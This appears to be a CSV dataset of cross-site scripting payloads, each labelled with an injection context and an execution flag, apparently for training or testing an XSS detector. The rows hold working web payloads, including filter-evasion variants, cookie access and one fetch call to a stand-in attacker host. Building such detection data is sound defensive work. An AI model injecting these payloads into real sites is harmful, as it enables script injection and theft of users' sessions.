payload,context,exec,combined
<script>alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>alert(1)</script>
<script>confirm(1)</script>,html_tag,1,CONTEXT_html_tag <script>confirm(1)</script>
<script>prompt(1)</script>,html_tag,1,CONTEXT_html_tag <script>prompt(1)</script>
<script>alert(document.cookie)</script>,html_tag,1,CONTEXT_html_tag <script>alert(document.cookie)</script>
<script>fetch('http://attacker.com')</script>,html_tag,1,CONTEXT_html_tag <script>fetch('http://attacker.com')</script>
<img src=x onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(1)>
<body onload=alert(1)>,html_tag,1,CONTEXT_html_tag <body onload=alert(1)>
<input onfocus=alert(1) autofocus>,html_tag,1,CONTEXT_html_tag <input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>,html_tag,1,CONTEXT_html_tag <details open ontoggle=alert(1)>
<ScRiPt>alert(1)</ScRiPt>,html_tag,1,CONTEXT_html_tag <ScRiPt>alert(1)</ScRiPt>
<script>alert(String.fromCharCode(49))</script>,html_tag,1,CONTEXT_html_tag <script>alert(String.fromCharCode(49))</script>
<script>\u0061lert(1)</script>,html_tag,1,CONTEXT_html_tag <script>\u0061lert(1)</script>
""" onmouseover=alert(1)",html_attribute,1,"CONTEXT_html_attribute "" onmouseover=alert(1)"
"""><script>alert(1)</script>",html_attribute,1,"CONTEXT_html_attribute ""><script>alert(1)</script>"
<svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag <svg/onload=alert(1)>
javascript:alert(1),url_href,1,CONTEXT_url_href javascript:alert(1)
"data:text/html,<script>alert(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(1)</script>"
'><svg/onload=alert(1)>,html_attribute,1,CONTEXT_html_attribute '><svg/onload=alert(1)>
"""><img src=x onerror=confirm(1)>",html_attribute,1,"CONTEXT_html_attribute ""><img src=x onerror=confirm(1)>"
</script><script>alert(1)</script>,script_block,1,CONTEXT_script_block </script><script>alert(1)</script>
<script>alert(document.domain)</script>,html_tag,1,CONTEXT_html_tag <script>alert(document.domain)</script>
<script>alert`1`</script>,html_tag,1,CONTEXT_html_tag <script>alert`1`</script>
<script>window.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>window.alert(1)</script>
<script>top.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>top.alert(1)</script>
<script>this.alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>this.alert(1)</script>
<img src=x onerror=confirm(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=prompt(1)>
<img src=1 onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <img src=1 onerror=alert(1)>
<img src=a onerror=alert(document.cookie)>,html_tag,1,CONTEXT_html_tag <img src=a onerror=alert(document.cookie)>
<img src=x onerror=alert('XSS')>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert('XSS')>
<img src=x onerror=alert(window.origin)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(window.origin)>
